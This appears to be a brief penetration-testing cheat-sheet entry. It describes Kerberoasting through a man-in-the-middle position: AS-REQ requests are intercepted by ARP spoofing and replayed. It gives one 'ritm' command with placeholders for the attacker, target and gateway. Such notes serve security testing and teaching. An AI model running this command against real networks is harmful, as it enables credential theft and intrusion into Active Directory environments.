# Kerberoasting

## With MitM

If no principal without pre-authentication are present, it is still possible to intercept the AS-REQ requests on the wire (with ARP spoofing for example), and replay them to kerberoast.

    ritm -i <attacker_IP> -t <target_IP> -g <gateway_to_spoof> -u users.txt
